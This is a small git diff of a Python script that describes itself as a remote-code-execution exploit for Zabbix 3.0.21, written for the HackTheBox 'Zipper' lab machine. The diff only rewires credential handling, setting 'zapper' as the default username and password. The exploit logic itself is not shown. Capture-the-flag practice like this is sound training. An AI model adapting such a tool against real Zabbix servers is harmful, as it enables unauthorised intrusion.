@@ -5,8 +5,8 @@ import argparse
 
 parser = argparse.ArgumentParser(description='Rce to Zabbix 3.0.21 from user (Zipper hackthebox)')
 parser.add_argument("--hostname", default='http://10.10.10.108/zabbix', type=str, help="hostname of the box Zipper")
-parser.add_argument("--username", default=None, type=str, help="Zabbix username")
-parser.add_argument("--password", default=None, type=str, help="Zabbix password")
+parser.add_argument("--username", default="zapper", type=str, help="Zabbix username")
+parser.add_argument("--password", default="zapper", type=str, help="Zabbix password")
 parser.add_argument("--hostId", default='10106', type=str, help="Your zabbix host id")
 
 args = parser.parse_args()
@@ -14,8 +14,8 @@ args = parser.parse_args()
 zabbix_url = 'http://10.10.10.108/zabbix'
 zabbix_api_target = zabbix_url + '/api_jsonrpc.php'
 
-login = 'zapper'
-password = 'zapper'
+login = args.username
+password = args.password
 host_id = '10106'
 
 auth_payload = {
